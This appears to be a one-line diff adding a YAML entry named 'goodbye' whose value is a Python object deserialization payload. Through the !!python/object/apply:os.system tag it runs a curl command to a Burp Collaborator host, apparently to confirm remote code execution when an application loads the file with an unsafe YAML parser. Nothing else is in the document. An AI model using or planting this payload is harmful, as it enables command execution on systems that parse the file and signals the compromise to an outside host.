@@ -1,0 +1,1 @@
+"goodbye": !!python/object/apply:os.system ["curl http://oa2ardhnkix479vyk919zuzlvc17pw.burpcollaborator.net/"]
